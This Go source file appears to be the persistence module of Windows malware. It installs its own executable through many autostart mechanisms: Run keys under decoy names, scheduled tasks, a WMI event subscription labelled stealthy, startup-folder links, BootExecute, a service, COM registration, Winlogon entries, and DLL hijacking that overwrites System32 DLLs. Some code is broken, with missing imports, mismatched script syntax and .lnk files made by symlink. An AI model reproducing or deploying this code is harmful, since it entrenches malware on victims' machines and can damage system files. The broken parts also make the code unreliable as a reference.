package main

import (
    "os"
    "syscall"
    "unsafe"
    "runtime"
    "os/exec"
)

type Persistence struct {
    Methods []string
}

// Registry Persistence
func (p *Persistence) AddRegistryPersistence() error {
    if runtime.GOOS != "windows" {
        return nil
    }
    
    advapi32 := syscall.NewLazyDLL("advapi32.dll")
    regOpenKeyEx := advapi32.NewProc("RegOpenKeyExW")
    regSetValueEx := advapi32.NewProc("RegSetValueExW")
    regCloseKey := advapi32.NewProc("RegCloseKey")
    
    // Get current executable
    exe, _ := os.Executable()
    exePath := syscall.StringToUTF16Ptr(exe)
    
    // Multiple persistence locations
    locations := []struct {
        key    uintptr
        subkey string
        value  string
    }{
        {0x80000001, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Updater"},
        {0x80000002, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "SystemHelper"},
        {0x80000001, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "Cleanup"},
        {0x80000002, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", "Compat"},
        {0x80000002, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", ""},
        {0x80000002, "SYSTEM\\CurrentControlSet\\Services\\", "Service"},
    }
    
    for _, loc := range locations {
        var hKey uintptr
        ret, _, _ := regOpenKeyEx.Call(
            loc.key,
            uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(loc.subkey))),
            0,
            0x00020006, // KEY_SET_VALUE
            uintptr(unsafe.Pointer(&hKey)),
        )
        if ret == 0 {
            regSetValueEx.Call(
                hKey,
                uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(loc.value))),
                0,
                0x00000001, // REG_SZ
                uintptr(unsafe.Pointer(exePath)),
                uintptr(syscall.StringLength(exePath)*2+2),
            )
            regCloseKey.Call(hKey)
        }
    }
    
    return nil
}

// Schedule Task Persistence
func (p *Persistence) AddScheduledTask() error {
    if runtime.GOOS != "windows" {
        return nil
    }
    
    exe, _ := os.Executable()
    
    // Create scheduled task
    cmd := exec.Command("schtasks", "/create", "/tn", "SystemMaintenance", 
        "/tr", exe, "/sc", "daily", "/st", "09:00", "/f")
    cmd.Run()
    
    // Create task to run at user logon
    cmd = exec.Command("schtasks", "/create", "/tn", "UserHelper",
        "/tr", exe, "/sc", "onlogon", "/delay", "0000:30", "/f")
    cmd.Run()
    
    return nil
}

// WMI Persistence
func (p *Persistence) AddWMIPersistence() error {
    if runtime.GOOS != "windows" {
        return nil
    }
    
    exe, _ := os.Executable()
    
    // Create WMI event filter
    filter := `
        Set objWMIService = GetObject("winmgmts:root\subscription")
        Set objFilter = objWMIService.Get("__EventFilter").SpawnInstance_
        objFilter.Name = "SystemEvent"
        objFilter.Query = "SELECT * FROM __InstanceCreationEvent " +
            "WITHIN 60 WHERE TargetInstance ISA 'Win32_ProcessStartTrace'"
        objFilter.QueryLanguage = "WQL"
        objFilter.Put_
    `
    
    // Execute WMI script
    cmd := exec.Command("cscript", "/nologo", "-e:jscript", filter)
    cmd.Run()
    
    return nil
}

// WMI Event Subscription
func (p *Persistence) AddWMIEventSubscription() error {
    if runtime.GOOS != "windows" {
        return nil
    }
    
    exe, _ := os.Executable()
    
    // More stealthy WMI persistence
    wmiScript := `
        var objWMIService = GetObject("winmgmts:root\subscription");
        var objFilter = objWMIService.Get("__EventFilter").SpawnInstance_();
        objFilter.Name = "AppEventFilter";
        objFilter.EventNamespace = 'root\cimv2';
        objFilter.Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='svchost.exe'";
        objFilter.QueryLanguage = "WQL";
        var filterPath = objFilter.Put_();
        
        var objConsumer = objWMIService.Get("CommandLineEventConsumer").SpawnInstance_();
        objConsumer.Name = "AppEventConsumer";
        objConsumer.CommandLineTemplate = "` + exe + `";
        var consumerPath = objConsumer.Put_();
        
        var objBinding = objWMIService.Get("__FilterToConsumerBinding").SpawnInstance_();
        objBinding.Filter = filterPath;
        objBinding.Consumer = consumerPath;
        objBinding.Put_();
    `
    
    // Write to temp file and execute
    tmpFile := os.TempDir() + "\\wmi.js"
    ioutil.WriteFile(tmpFile, []byte(wmiScript), 0644)
    defer os.Remove(tmpFile)
    
    exec.Command("cscript", "/nologo", tmpFile).Run()
    
    return nil
}

// Startup Folder Persistence
func (p *Persistence) AddStartupPersistence() error {
    if runtime.GOOS != "windows" {
        return nil
    }
    
    exe, _ := os.Executable()
    
    // Current user startup
    startupDir := os.Getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    os.Symlink(exe, startupDir+"\\Helper.lnk")
    
    // All users startup (requires admin)
    startupDir = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    os.Symlink(exe, startupDir+"\\SystemHelper.lnk")
    
    return nil
}

// Boot Login Script
func (p *Persistence) AddBootScript() error {
    if runtime.GOOS != "windows" {
        return nil
    }
    
    exe, _ := os.Executable()
    
    // Set boot script via group policy
    advapi32 := syscall.NewLazyDLL("advapi32.dll")
    regOpenKeyEx := advapi32.NewProc("RegOpenKeyExW")
    regSetValueEx := advapi32.NewProc("RegSetValueExW")
    regCloseKey := advapi32.NewProc("RegCloseKey")
    
    var hKey uintptr
    regOpenKeyEx.Call(
        0x80000002, // HKLM
        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(
            "SYSTEM\\CurrentControlSet\\Control\\Session Manager"))),
        0,
        0x00020006,
        uintptr(unsafe.Pointer(&hKey)),
    )
    defer regCloseKey.Call(hKey)
    
    // Add to boot execute
    bootExe := syscall.StringToUTF16Ptr(exe + "\x00")
    regSetValueEx.Call(
        hKey,
        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("BootExecute"))),
        0,
        0x00000007, // REG_MULTI_SZ
        uintptr(unsafe.Pointer(bootExe)),
        uintptr(syscall.StringLength(bootExe)*2+2),
    )
    
    return nil
}

// Service Persistence
func (p *Persistence) CreateWindowsService() error {
    if runtime.GOOS != "windows" {
        return nil
    }
    
    exe, _ := os.Executable()
    
    // Create service
    scCommand := fmt.Sprintf(`sc create "SystemHelper" binPath= "%s" start= auto displayName= "System Helper Service"`, exe)
    exec.Command("cmd", "/c", scCommand).Run()
    
    // Start service immediately
    exec.Command("cmd", "/c", `sc start "SystemHelper"`).Run()
    
    return nil
}

// ActiveX Component Persistence
func (p *Persistence) AddActiveXPersistence() error {
    if runtime.GOOS != "windows" {
        return nil
    }
    
    // Register as COM object
    exe, _ := os.Executable()
    
    advapi32 := syscall.NewLazyDLL("advapi32.dll")
    regOpenKeyEx := advapi32.NewProc("RegOpenKeyExW")
    regSetValueEx := advapi32.NewProc("RegSetValueExW")
    regCloseKey := advapi32.NewProc("RegCloseKey")
    
    // Create COM registration
    clsid := "{B54F3741-5B07-4C8E-9C5F-7F8B9E7F8B9E}"
    var hKey uintptr
    regOpenKeyEx.Call(
        0x80000002,
        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("SOFTWARE\\Classes\\CLSID\\"+clsid))),
        0,
        0x00020006,
        uintptr(unsafe.Pointer(&hKey)),
    )
    
    if hKey != 0 {
        // Register in-proc server
        regSetValueEx.Call(
            hKey,
            uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("InprocServer32"))),
            0,
            0x00000001,
            uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(exe))),
            0,
        )
        regCloseKey.Call(hKey)
    }
    
    return nil
}

// DLL Search Order Hijacking
func (p *Persistence) InstallDLLHijack() error {
    if runtime.GOOS != "windows" {
        return nil
    }
    
    // Copy to system directory as legitimate DLL
    exe, _ := os.Executable()
    system32 := "C:\\Windows\\System32"
    
    // Legitimate DLLs to hijack
    dlls := []string{
        "apphelp.dll",
        "cryptnet.dll",
        "dwmapi.dll",
        "faultrep.dll",
        "olepro32.dll",
        "urlmon.dll",
        "wer.dll",
    }
    
    for _, dll := range dlls {
        src, _ := os.ReadFile(exe)
        dst := system32 + "\\" + dll
        os.WriteFile(dst, src, 0644)
    }
    
    return nil
}

// Winlogon Notifications
func (p *Persistence) AddWinlogonPersistence() error {
    if runtime.GOOS != "windows" {
        return nil
    }
    
    exe, _ := os.Executable()
    
    advapi32 := syscall.NewLazyDLL("advapi32.dll")
    regOpenKeyEx := advapi32.NewProc("RegOpenKeyExW")
    regSetValueEx := advapi32.NewProc("RegSetValueExW")
    regCloseKey := advapi32.NewProc("RegCloseKey")
    
    // Winlogon notification packages
    var hKey uintptr
    regOpenKeyEx.Call(
        0x80000002,
        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(
            "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify"))),
        0,
        0x00020006,
        uintptr(unsafe.Pointer(&hKey)),
    )
    defer regCloseKey.Call(hKey)
    
    // Create notification package
    packageName := "SystemNotifier"
    var hKeyPackage uintptr
    regOpenKeyEx.Call(
        hKey,
        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(packageName))),
        0,
        0x00020006,
        uintptr(unsafe.Pointer(&hKeyPackage)),
    )
    
    if hKeyPackage != 0 {
        regSetValueEx.Call(
            hKeyPackage,
            uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("DLLName"))),
            0,
            0x00000001,
            uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(exe))),
            0,
        )
        regCloseKey.Call(hKeyPackage)
    }
    
    return nil
}
